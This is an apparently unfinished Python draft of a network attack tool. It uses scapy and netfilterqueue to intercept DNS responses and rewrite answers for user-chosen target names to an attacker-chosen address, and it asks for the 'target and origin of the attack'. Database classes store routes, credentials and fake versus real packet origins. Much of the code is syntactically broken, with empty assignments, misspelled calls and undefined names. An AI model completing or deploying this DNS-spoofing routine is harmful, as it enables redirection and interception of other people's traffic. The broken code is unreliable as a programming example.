#
from sqlalchemy import create_engine, Column, Integer, String, MetaData, Table, Select
from sqlalchemy.orm import declarative_base, sessionmaker, session
from pandas import DataFrame, MultiIndex, Series
import numpy
import threading
import netfilterqueqe
import sys 
import sqlite3 
import logging
import functools
import scapy.all as cap
import socketserver as ss
import asyncio as sync 
import argparse
import string


logging.basicConfig(
    level=logging.DEBUG,
    format='(%(Appname)s %(threadName)-10s) %(message)s',
    filename="sycllapp.log"
);

e = threading.Event()

que = netfilterqueqe.NetfilterQueqe()

local_server_local_address= 

string_list_of_internet_services= 



class Datawarehouse(abc):
    def __init__(self, *args):
        self.addresses=
        self.credentials=
        __db_address_data= DataFrame()
        __local_credentials_data= DataFrame()
        __gateway_index_map=

        

class RemoteDB(Datawarehouse):
    def __init__(self):
        self.engine = create_engine(f"sqlite:///{}")
        self.Session = sessionmaker(binsd=self.engine)
        self.metadata = MetaData(bind=self.engine)

    def _selection_map_of_routes(self):

        ...
    
    def _selection_map_of_service_history(self):
        ...


    def _initialize_database(self):

        class RemoteRouteIndex:

        RemoteRoutes()

        class RemoteEdgeIndex:

        RemoteEdgeIndex()
        if :
            metadata.create_all(self.engine)
        elif : 

        else : 


class UserDatabase(RemoteDB):
    def __init__(self,):
        super().__init__()


    def when_remote_is_not():
        self._initialize_database()

    
    def _create_local_product_routing_table(self):
        class LocalRoutes(Base):
            __route_tablename__ = "local_routing_table"
            mapid = Column(Integer, nullable=True)
            hostname = Column(String, primary_key=False )
            gatewayipv4=Column(Binary(16), primary_key=True, nullable=False)
            gatewayipv6= Column(Binary(4), primary_key=True, nullable=False)
            host_ipv4_address = Column(Binary(4), nullable=True)
            host_ipv6_address = Column(Binary(16), primary_key=True, unique=True, nullable=False)
            host_mac_address = Column(String, unique=True, nullable=True)
        LocalRoutes()
            
     def _create_local_product_port_services_table(self):
        class LocalPortMapping(Base):
            __port_tablename__ = "local_port_table"
            mapid = Column(Interger, nullable=True)
            services=Column(String, primary_key=True, nullable=True )
            hostname=Column(String, nullable=True)
            host_ipv4_address= Column(Binary(4))
            host_ipv6_address= Column(Binary(16))
        LocalPortMapping()





class ProductDatabase(UserDatabase):
    def __init__(self):
        super().__init__(db_name)
        self._create_product_table()
        self.email = 


    def _create_remote_product_routing_table(self):
        class RemoteRoutingTable ():
        
        RemoteRoutingTable()
            
            ...
    def _create_remote_product_port_table():
        class RemotePortMapTable():

        RemotePortMapTable()
            ...
   

    self.session = db.connection()
    add= session.add()
    commit= session.commit()
    search= 


class IndividualFactorDistribution:
    def __init__(self):
        self.edge = DataFrame( [], columns = [ 'destination' , 'fake_origin', ' real_origin' ])
       @abstractdata
       def index(*):

class MultiFactorDistribution:
    def __init__(self):
        self.node = Series 


class FrameworkData(IndividualFactorDistribution, MultiFactorDistribution, ProductDatabase):
    def __init__(self):
        super()__new__(edge, node):
            self.target_host_data= []
            self.packet_origin_address_data= []
            ret

   async def _select_data(): 
        ...


intel = ProductDatabase()


def user_input_target(self, *args):
   target = 
    if args.get == ['target*']:
            target.append(args.get['target']) 
        return destination
    else:
        return 0 
    ...

def user_input_origin( *args):
    origin = 
    if args.get == ['origin*']: 
    ...

target_by_user = user_input_target
origin_by_user = user_input_origin
parser = argparse.ArgumentParser(
    description=' Enter the target and origin of the attack',
)

def scan_prompt_data(self) -> :
    print('set arguemnets: ', sys.argv)
    if self.prompt_data is not None: 
        sys.stdout.write()



def discover_host(*args):
   

def establish_link_with_target(target):
    ...


def spoof(packet):
    packet = cap.IP(packet.get_payload())
    while packet.haslayer(cap.DNSRR):
        qname = packet[cap.DNSQR].qname 
        for i in target_by_user:
            if target_by_user in qname: 
                payload = cap.DNSRR(rrname=qname, rdata=origin_by_user)
                packet[cap.DNS].an = payload 
                packet[cap.DNS].ancount = 1
                del packet[cap.IP].len
                del packet[cap.IP].chksum
                del packet[cap.UDP].chksum
                del packet[cap.UDP].chksum
                del packet[cap.UDP].len 
            packet.set_payload(str(cap_packet))


e= threading.Event()

scan_input_thread = threading.Thread(
    name=' scanning user input %()s'
    target = scan_prompt_data,
    args=(e,)
)

process_spoof_thread = threading.Thread(
    name=' packet processing %()s'
    target= process,
    args=(e,),
)

log = logging.getProcess()

process = ( process_spoof_thread  )
def main():
  parser.add_arguemnt('end', action=, default=False)
  parser.add_arguemnt('start', action=, default=True)
  parser.addd_arguement('get', action=, default=False)
  parser.add_arguemnt('--spoof',action=,default=False)
  parser.add_arguement('--connect',action=,default=False)
  while :
    if :
        queue = q.bind(0, )
    elif :
    
    elif :

if __name__ is __main__:
    main()